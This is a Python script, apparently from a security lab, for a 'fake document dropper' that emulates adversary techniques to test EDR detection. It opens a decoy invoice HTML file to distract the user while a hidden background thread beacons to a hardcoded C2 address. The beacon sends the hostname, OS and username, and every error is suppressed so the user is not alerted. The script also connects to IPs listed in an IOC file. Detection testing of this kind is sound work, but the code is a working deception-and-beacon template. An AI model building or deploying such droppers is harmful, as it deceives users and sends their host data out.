#!/usr/bin/env python3
"""
Fake Document Dropper - Social Engineering Payload Delivery

MITRE ATT&CK Techniques:
- T1204.002: User Execution: Malicious File
- T1036.005: Masquerading: Match Legitimate Name or Location
- T1027: Obfuscated Files or Information

Mục đích:
- Mô phỏng kỹ thuật dropper: mở tài liệu giả (decoy) để đánh lừa người dùng
- Trong khi đó, payload C2 chạy ngầm ở background
- Dùng để kiểm thử khả năng phát hiện của EDR/XDR

Cảnh báo: Script này CHỈ dùng cho mục đích nghiên cứu và kiểm thử bảo mật.

Author: Cyberfortress Labs
Version: 1.0.0
"""

import os
import sys
import subprocess
import threading
import time
import socket
import tempfile
import base64
from pathlib import Path
from datetime import datetime


# ============================================================================
# CONFIGURATION
# ============================================================================

# C2 Server Configuration
DEFAULT_C2_HOST = "192.168.71.100"
DEFAULT_C2_PORT = 80
CONNECTION_TIMEOUT = 10

# IOC File for trigger mode (optional)
IOC_FILE = "malicious_ip.txt"


# ============================================================================
# EMBEDDED DECOY DOCUMENT (Base64 encoded)
# ============================================================================

# Đây là nội dung HTML giả dạng tài liệu - sẽ được mở trong browser
# Trong thực tế, có thể nhúng file PDF/DOCX thật
DECOY_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Invoice #2024-001</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
        .header { text-align: center; border-bottom: 2px solid #333; padding-bottom: 20px; }
        .invoice-info { margin: 20px 0; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        th { background-color: #4472C4; color: white; }
        .total { font-weight: bold; font-size: 1.2em; }
        .footer { margin-top: 40px; text-align: center; color: #666; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="header">
        <h1>INVOICE</h1>
        <p>Invoice #: INV-2024-001</p>
        <p>Date: December 28, 2024</p>
    </div>
    
    <div class="invoice-info">
        <p><strong>From:</strong> Cyberfortress Labs</p>
        <p><strong>To:</strong> Customer Name</p>
    </div>
    
    <table>
        <tr>
            <th>Description</th>
            <th>Quantity</th>
            <th>Unit Price</th>
            <th>Amount</th>
        </tr>
        <tr>
            <td>Security Assessment Service</td>
            <td>1</td>
            <td>$5,000.00</td>
            <td>$5,000.00</td>
        </tr>
        <tr>
            <td>Penetration Testing</td>
            <td>1</td>
            <td>$3,000.00</td>
            <td>$3,000.00</td>
        </tr>
        <tr>
            <td>Report Documentation</td>
            <td>1</td>
            <td>$500.00</td>
            <td>$500.00</td>
        </tr>
    </table>
    
    <p class="total">Total: $8,500.00</p>
    
    <div class="footer">
        <p>Thank you for your business!</p>
        <p>Payment due within 30 days.</p>
    </div>
</body>
</html>
"""


# ============================================================================
# DROPPER CLASS
# ============================================================================

class DocumentDropper:
    """
    Fake Document Dropper - Opens decoy document while running payload.
    """
    
    def __init__(
        self,
        c2_host: str = DEFAULT_C2_HOST,
        c2_port: int = DEFAULT_C2_PORT,
        decoy_type: str = "invoice",
        silent: bool = True
    ):
        """
        Initialize the dropper.
        
        Args:
            c2_host: C2 server IP address
            c2_port: C2 server port
            decoy_type: Type of decoy document (invoice, report, etc.)
            silent: Run payload silently (no console output)
        """
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.decoy_type = decoy_type
        self.silent = silent
        self.payload_thread = None
        
    def show_decoy(self) -> None:
        """
        Display the decoy document to trick the user.
        Opens an HTML file in the default browser.
        """
        try:
            # Create temporary HTML file
            temp_dir = tempfile.gettempdir()
            decoy_path = os.path.join(temp_dir, f"Invoice_2024_{datetime.now().strftime('%H%M%S')}.html")
            
            with open(decoy_path, 'w', encoding='utf-8') as f:
                f.write(DECOY_HTML)
            
            # Open in default browser/application
            if sys.platform == 'win32':
                os.startfile(decoy_path)
            elif sys.platform == 'darwin':
                subprocess.run(['open', decoy_path], check=False)
            else:
                subprocess.run(['xdg-open', decoy_path], check=False)
                
        except Exception as e:
            if not self.silent:
                print(f"[-] Failed to show decoy: {e}")
    
    def run_payload(self) -> None:
        """
        Execute the C2 payload in background.
        This triggers IOC detection by connecting to malicious IPs.
        """
        try:
            # Method 1: Connect to configured C2 server
            self._beacon_c2()
            
            # Method 2: If IOC file exists, trigger all IPs
            ioc_path = self._find_ioc_file()
            if ioc_path:
                self._trigger_iocs(ioc_path)
                
        except Exception as e:
            if not self.silent:
                print(f"[-] Payload error: {e}")
    
    def _beacon_c2(self) -> None:
        """Send beacon to C2 server."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            sock.connect((self.c2_host, self.c2_port))
            
            # Send beacon data
            import platform
            beacon = f"BEACON|{socket.gethostname()}|{platform.system()}|{os.getenv('USERNAME', 'unknown')}|{datetime.now().isoformat()}\n"
            sock.send(beacon.encode())
            
            sock.close()
        except:
            pass  # Silent fail - don't alert user
    
    def _find_ioc_file(self) -> str:
        """Find IOC file in common locations."""
        locations = [
            IOC_FILE,
            os.path.join(os.path.dirname(sys.argv[0]), IOC_FILE),
            os.path.join(os.path.dirname(__file__), IOC_FILE),
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                return loc
        return None
    
    def _trigger_iocs(self, ioc_path: str) -> None:
        """Trigger all IPs in IOC file."""
        try:
            with open(ioc_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self._trigger_single_ip(line)
                        time.sleep(0.5)
        except:
            pass
    
    def _trigger_single_ip(self, ip: str) -> None:
        """Attempt connection to single IP."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, self.c2_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: c2\r\n\r\n")
            sock.close()
        except:
            pass
    
    def execute(self) -> None:
        """
        Main execution - run dropper.
        1. Start payload in background thread
        2. Show decoy document to user
        """
        # Start payload in background (async)
        self.payload_thread = threading.Thread(target=self.run_payload, daemon=True)
        self.payload_thread.start()
        
        # Show decoy document (this is what user sees)
        self.show_decoy()
        
        # Wait for payload to complete (max 30 seconds)
        self.payload_thread.join(timeout=30)


# ============================================================================
# MAIN
# ============================================================================

def main():
    """Main entry point - executes dropper silently."""
    # Parse embedded config or command line
    c2_host = os.getenv("C2_HOST", DEFAULT_C2_HOST)
    c2_port = int(os.getenv("C2_PORT", DEFAULT_C2_PORT))
    
    # Create and execute dropper
    dropper = DocumentDropper(
        c2_host=c2_host,
        c2_port=c2_port,
        silent=True
    )
    dropper.execute()


if __name__ == "__main__":
    main()
